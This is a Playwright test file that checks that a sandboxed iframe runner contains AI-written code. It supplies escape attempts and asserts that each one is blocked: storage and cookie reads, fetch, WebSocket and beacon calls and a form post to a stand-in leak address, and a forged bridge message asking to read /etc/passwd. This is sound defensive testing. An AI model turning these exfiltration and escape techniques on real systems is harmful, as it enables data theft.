import { expect, test, type Page } from '@playwright/test';
import {
  SANDBOX_ALLOW,
  SANDBOX_FLAGS,
  SANDBOX_REFERRER_POLICY,
} from '../../packages/ui/src/lib/sandbox-attrs';

/**
 * Escape attempts against the sandbox runner (ADR 0019, layer 2; AC7, AC8). The code under test is what a
 * compromised or tricked assistant could write; it is given to the real runner, embedded with the same iframe
 * attributes as `SandboxFrame`. It does not go through the API's static check on purpose: that check is a courtesy,
 * the sandbox is the boundary. No login or database is needed: the runner is a static server and the host page
 * comes from `sandbox-host.mjs`.
 */

const RUNNER = process.env.E2E_RUNNER ?? 'http://localhost:3101';
/** A tiny page served by `sandbox-host.mjs`: a real local server, because Chrome blocks a mocked page from framing localhost. */
const HOST_URL = 'http://localhost:3418/';

/** Reports an outcome to the host the only way a block can: an allowlisted bridge message. */
const report = `function report(name, outcome) {
  parent.postMessage({ v: 1, id: 'r-' + name, op: 'ui.error', args: { message: 'RESULT ' + name + ' ' + outcome } }, '*');
}
function attempt(name, fn) {
  try { var value = fn(); report(name, 'ran:' + String(value)); } catch (e) { report(name, 'blocked:' + (e && e.name)); }
}`;

/**
 * What the code's requests came to. `leaks` are requests that really went to the network (the route handler only
 * sees those); `blocked` are requests the browser refused before sending, by CSP. A secure runner has no leaks.
 */
interface Watch {
  leaks: string[];
  blocked: string[];
}

async function open(page: Page, html: string, watch: Watch) {
  await page.context().route('**/leak**', async (route) => {
    watch.leaks.push(route.request().url());
    await route.fulfill({ status: 200, body: 'leaked' });
  });
  page.on('requestfailed', (request) => {
    if (request.url().includes('/leak'))
      watch.blocked.push(`${request.url()} ${request.failure()?.errorText}`);
  });
  await page.goto(HOST_URL);
  await page.evaluate(
    ([attrs, source]) =>
      (window as unknown as { run(a: unknown, h: string): void }).run(attrs, source as string),
    [
      {
        sandbox: SANDBOX_FLAGS,
        allow: SANDBOX_ALLOW,
        referrerPolicy: SANDBOX_REFERRER_POLICY,
        src: `${RUNNER}/runner.html`,
      },
      html,
    ] as const,
  );
}

type Relayed = {
  origin: string;
  data: { op?: string; kind?: string; args?: { message?: string } };
};
const messages = (page: Page) =>
  page.evaluate(() => (window as unknown as { __messages: Relayed[] }).__messages);

async function results(page: Page, names: string[]): Promise<Record<string, string>> {
  await expect
    .poll(
      async () => {
        const seen = (await messages(page)).map((m) => m.data.args?.message ?? '');
        return names.every((name) => seen.some((text) => text.startsWith(`RESULT ${name} `)));
      },
      { timeout: 10_000 },
    )
    .toBe(true);
  const out: Record<string, string> = {};
  for (const m of await messages(page)) {
    const text = m.data.args?.message ?? '';
    const match = /^RESULT (\S+) (.*)$/.exec(text);
    if (match) out[match[1]!] = match[2]!;
  }
  return out;
}

test.describe('sandbox runner', () => {
  test('serves the strict headers', async ({ request }) => {
    const res = await request.get(`${RUNNER}/runner.html`);
    expect(res.status()).toBe(200);
    const csp = res.headers()['content-security-policy'] ?? '';
    for (const directive of [
      "default-src 'none'",
      "connect-src 'none'",
      "form-action 'none'",
      "base-uri 'none'",
      "frame-src 'self' about:",
    ])
      expect(csp).toContain(directive);
    expect(res.headers()['cross-origin-opener-policy']).toBe('same-origin');
    expect(res.headers()['x-content-type-options']).toBe('nosniff');
    expect(res.headers()['set-cookie']).toBeUndefined();
  });

  test('runs a harmless page, reports ready and a size, and tags messages with the opaque origin', async ({
    page,
  }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    await open(
      page,
      `<button id="b">Nghe</button><script>
         window.cuelingo.resize(120).catch(function(){});
       </script>`,
      watch,
    );
    await expect
      .poll(async () => (await messages(page)).some((m) => m.data.op === 'ui.ready'))
      .toBe(true);
    const all = await messages(page);
    // A frame without allow-same-origin reports the string "null", never the runner's own origin.
    expect(all.every((m) => m.origin === 'null')).toBe(true);
    expect(all.some((m) => m.data.op === 'ui.resize')).toBe(true);
    expect(watch.leaks).toEqual([]);
  });

  test('cannot reach the parent, the top page, cookies or storage (AC7)', async ({ page }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    await open(
      page,
      `<script>${report}
         attempt('parent-document', function () { return parent.document.title; });
         attempt('top-document', function () { return top.document.title; });
         attempt('top-location-read', function () { return top.location.href; });
         attempt('cookie', function () { return document.cookie; });
         attempt('local-storage', function () { return localStorage.getItem('x'); });
         attempt('session-storage', function () { return sessionStorage.length; });
         attempt('indexed-db', function () { return indexedDB.open('x') && 'opened'; });
       </script>`,
      watch,
    );
    const out = await results(page, [
      'parent-document',
      'top-document',
      'top-location-read',
      'cookie',
      'local-storage',
      'session-storage',
    ]);
    for (const name of [
      'parent-document',
      'top-document',
      'top-location-read',
      'cookie',
      'local-storage',
      'session-storage',
    ])
      expect(out[name], name).toMatch(/^blocked:/);
    expect(watch.leaks).toEqual([]);
  });

  test('cannot open a connection of any kind (AC7)', async ({ page }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    const target = 'http://127.0.0.1:9/leak';
    await open(
      page,
      `<script>${report}
         var violations = 0;
         document.addEventListener('securitypolicyviolation', function () { violations += 1; });
         attempt('websocket', function () { new WebSocket('ws://127.0.0.1:9/leak'); return 'constructed'; });
         attempt('event-source', function () { new EventSource('${target}'); return 'constructed'; });
         attempt('xhr', function () { var x = new XMLHttpRequest(); x.open('GET', '${target}'); x.send(); return 'sent'; });
         attempt('beacon', function () { return navigator.sendBeacon('${target}', 'x'); });
         attempt('image', function () { new Image().src = '${target}.png'; return 'requested'; });
         attempt('worker', function () { new Worker('${target}.js'); return 'started'; });
         fetch('${target}').then(
           function () { report('fetch', 'ran:resolved'); },
           function (e) { report('fetch', 'blocked:' + (e && e.name)); }
         );
         setTimeout(function () { report('violations', String(violations)); }, 800);
       </script>`,
      watch,
    );
    const out = await results(page, ['fetch', 'violations', 'beacon', 'image']);
    expect(out.fetch).toMatch(/^blocked:/);
    expect(Number(out.violations)).toBeGreaterThan(0);
    // The decisive check: whatever the code did, nothing was ever requested from the leak address.
    await page.waitForTimeout(500);
    expect(watch.leaks).toEqual([]);
    // Chrome refused the attempts itself, by policy, before anything was sent.
    expect(watch.blocked.length).toBeGreaterThan(0);
    expect(watch.blocked.every((entry) => /csp/i.test(entry))).toBe(true);
  });

  test('cannot navigate, open windows or submit forms (AC7)', async ({ page, context }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    const popups: string[] = [];
    context.on('page', (popup) => popups.push(popup.url()));
    await open(
      page,
      `<form id="f" action="http://127.0.0.1:9/leak" method="post"><input name="a" value="secret"></form>
       <script>${report}
         attempt('window-open', function () { return window.open('http://127.0.0.1:9/leak') === null ? 'null' : 'window'; });
         attempt('top-navigate', function () { top.location = 'http://127.0.0.1:9/leak'; return 'assigned'; });
         attempt('parent-navigate', function () { parent.location = 'http://127.0.0.1:9/leak'; return 'assigned'; });
         attempt('form-submit', function () { document.getElementById('f').submit(); return 'submitted'; });
         attempt('self-navigate', function () { location.href = 'http://127.0.0.1:9/leak'; return 'assigned'; });
         attempt('meta-refresh', function () {
           var m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=http://127.0.0.1:9/leak';
           document.head.appendChild(m); return 'added';
         });
       </script>`,
      watch,
    );
    const out = await results(page, [
      'window-open',
      'top-navigate',
      'parent-navigate',
      'form-submit',
    ]);
    expect(out['window-open']).toBe('ran:null');
    expect(out['top-navigate']).toMatch(/^blocked:/);
    expect(out['parent-navigate']).toMatch(/^blocked:/);
    await page.waitForTimeout(1000);
    expect(watch.leaks).toEqual([]);
    expect(popups).toEqual([]);
    // The host page is where it was, and the block did not turn into another page.
    expect(page.url()).toBe(HOST_URL);
    await expect(page.locator('#alive')).toHaveText('host page');
    const urls = page.frames().map((f) => f.url());
    expect(urls.some((u) => u.includes('127.0.0.1:9'))).toBe(false);
  });

  test('drops forged, unknown and oversized messages before the host sees them (AC9)', async ({
    page,
  }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    await open(
      page,
      `<script>
         var send = function (m) { parent.postMessage(m, '*'); };
         send({ v: 1, id: 'a', op: 'fs.read', args: { path: '/etc/passwd' } });
         send({ v: 1, id: 'b', op: '__proto__', args: {} });
         send({ v: 2, id: 'c', op: 'ui.ready' });
         send({ v: 1, id: 'big', op: 'tts.speak', args: { text: new Array(100001).join('a') } });
         send({ v: 1, id: 'cyc', op: 'ui.ready', args: (function () { var o = {}; o.o = o; return o; })() });
         send({ v: 1, id: 'ok', op: 'ui.resize', args: { height: 150 } });
       </script>`,
      watch,
    );
    await expect
      .poll(async () => (await messages(page)).some((m) => m.data.op === 'ui.resize'))
      .toBe(true);
    await page.waitForTimeout(500);
    const ops = (await messages(page)).map((m) => `${m.data.op}`);
    expect(ops).not.toContain('fs.read');
    expect(ops).not.toContain('__proto__');
    expect(ops).not.toContain('tts.speak');
    expect((await messages(page)).some((m) => (m.data as { id?: string }).id === 'big')).toBe(
      false,
    );
  });

  test('a page stuck in a loop does not freeze the chat page (AC8)', async ({ page }) => {
    const watch: Watch = { leaks: [], blocked: [] };
    await open(page, `<script>while (true) {}</script>`, watch);
    // Let the runner load and hand over the page, then watch the host's own main thread for a few seconds.
    await page.waitForTimeout(5000);
    // A page that froze would show one long gap between two ticks. (The automation round trip itself can be
    // slow while a frame spins, so the page measures itself.)
    const maxGap = await page.evaluate(() => (window as unknown as { __maxGap: number }).__maxGap);
    expect(maxGap).toBeLessThan(1000);
    await expect(page.locator('#alive')).toHaveText('host page');
    // It never said it was ready, which is what makes the host's watchdog remove the block after 3 seconds.
    expect((await messages(page)).some((m) => m.data.op === 'ui.ready')).toBe(false);
  });
});
